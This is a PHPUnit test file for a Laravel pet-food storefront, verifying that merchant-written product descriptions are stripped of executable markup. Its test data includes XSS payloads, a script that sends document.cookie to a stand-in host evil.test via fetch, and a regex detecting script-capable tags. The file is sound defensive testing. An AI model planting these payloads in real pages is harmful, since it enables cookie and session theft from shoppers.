<?php

namespace Tests\Feature;

use App\Models\Category;
use App\Models\Product;
use App\Models\User;
use Illuminate\Foundation\Testing\RefreshDatabase;
use PHPUnit\Framework\Attributes\DataProvider;
use Tests\TestCase;

/**
 * Product descriptions are rendered as HTML rather than escaped, so they are
 * the one place on the storefront where somebody else's markup reaches a
 * customer's browser. Merchants sign themselves up, so that markup is not
 * trustworthy and is cleaned before it is stored.
 */
class RichTextSafetyTest extends TestCase
{
    use RefreshDatabase;

    protected function setUp(): void
    {
        parent::setUp();

        $this->seed();
    }

    private function merchant(): User
    {
        return User::where('email', 'pawsome@mealsonwheels.test')->firstOrFail();
    }

    /**
     * Each case is the payload, the fragment that must not survive into the
     * column, and a marker unique to the payload.
     *
     * The two differ on purpose: the page legitimately contains `<script>` and
     * `<style>` tags of its own, so a page-level assertion has to look for
     * something only this payload could have put there.
     *
     * @return array<string, array{0: string, 1: string, 2: string}>
     */
    public static function payloads(): array
    {
        return [
            'script tag' => ['<p>Fine.</p><script>alert(1)</script>', '<script', 'alert(1)'],
            'event handler' => ['<p onclick="steal()">Fine.</p>', 'onclick', 'steal()'],
            'image error handler' => ['<img src=x onerror="boom()">', 'onerror', 'boom()'],
            'javascript href' => ['<a href="javascript:alert(1)">click</a>', 'javascript:', 'javascript:alert'],
            'iframe' => ['<iframe src="https://evil.test"></iframe>', '<iframe', 'evil.test'],
            'style block' => ['<style>body{display:none}</style>', '<style', 'body{display:none}'],
            'svg handler' => ['<svg onload="boom()"></svg>', 'onload', 'boom()'],
            'form' => ['<form action="https://evil.test"><input name="card"></form>', '<form', 'name="card"'],
        ];
    }

    #[DataProvider('payloads')]
    public function test_hostile_markup_never_reaches_the_column(string $html, string $forbidden, string $marker): void
    {
        $product = Product::approved()->firstOrFail();

        $product->update(['description' => $html, 'additional_info' => $html]);
        $product->refresh();

        foreach ([$product->description, $product->additional_info] as $stored) {
            $this->assertStringNotContainsString($forbidden, $stored);
            $this->assertStringNotContainsString($marker, $stored);
        }
    }

    #[DataProvider('payloads')]
    public function test_hostile_markup_never_reaches_the_storefront(string $html, string $forbidden, string $marker): void
    {
        $product = Product::approved()->firstOrFail();
        $product->update(['description' => $html]);

        $this->get("/product/{$product->slug}")
            ->assertOk()
            ->assertDontSee($marker, false);
    }

    public function test_a_merchant_submission_is_cleaned_on_the_way_in(): void
    {
        $this->actingAs($this->merchant())->post('/merchant/products', [
            'name' => 'Chew Sticks',
            'category_id' => Category::where('slug', 'dog')->value('id'),
            'price' => '150.00',
            'stock' => '10',
            'description' => '<p>Tasty.</p><script>fetch("//evil.test?c="+document.cookie)</script>',
            'additional_info' => '<p onmouseover="x()">Store cool.</p>',
        ]);

        $product = Product::where('name', 'Chew Sticks')->firstOrFail();

        $this->assertStringNotContainsString('<script', $product->description);
        $this->assertStringNotContainsString('evil.test', $product->description);
        $this->assertStringNotContainsString('onmouseover', $product->additional_info);

        // The legitimate part of the submission survives.
        $this->assertStringContainsString('Tasty.', $product->description);
        $this->assertStringContainsString('Store cool.', $product->additional_info);
    }

    public function test_ordinary_editor_markup_is_kept(): void
    {
        $product = Product::approved()->firstOrFail();

        $product->update([
            'description' => '<p>Good <strong>value</strong> and <em>tasty</em>.</p>'
                .'<ul><li>One</li><li>Two</li></ul>'
                .'<h3>Feeding</h3><a href="https://example.test" title="More">Details</a>',
        ]);

        $kept = $product->fresh()->description;

        foreach (['<p>', '<strong>', '<em>', '<ul>', '<li>', '<h3>', 'https://example.test'] as $fragment) {
            $this->assertStringContainsString($fragment, $kept, "the sanitiser removed {$fragment}");
        }
    }

    public function test_the_seeded_catalog_survives_sanitising(): void
    {
        foreach (Product::all() as $product) {
            $this->assertNotEmpty(
                trim(strip_tags($product->description)),
                "{$product->name} lost its description"
            );
        }
    }

    /**
     * Nothing in the catalog may contain markup capable of running script,
     * whatever route put it there.
     */
    public function test_no_product_in_the_catalog_carries_executable_markup(): void
    {
        foreach (Product::all() as $product) {
            $html = $product->description.$product->additional_info;

            $this->assertDoesNotMatchRegularExpression(
                '/<\s*(script|iframe|object|embed|style|form)\b|\son[a-z]+\s*=|javascript:/i',
                $html,
                "{$product->name} carries executable markup"
            );
        }
    }
}
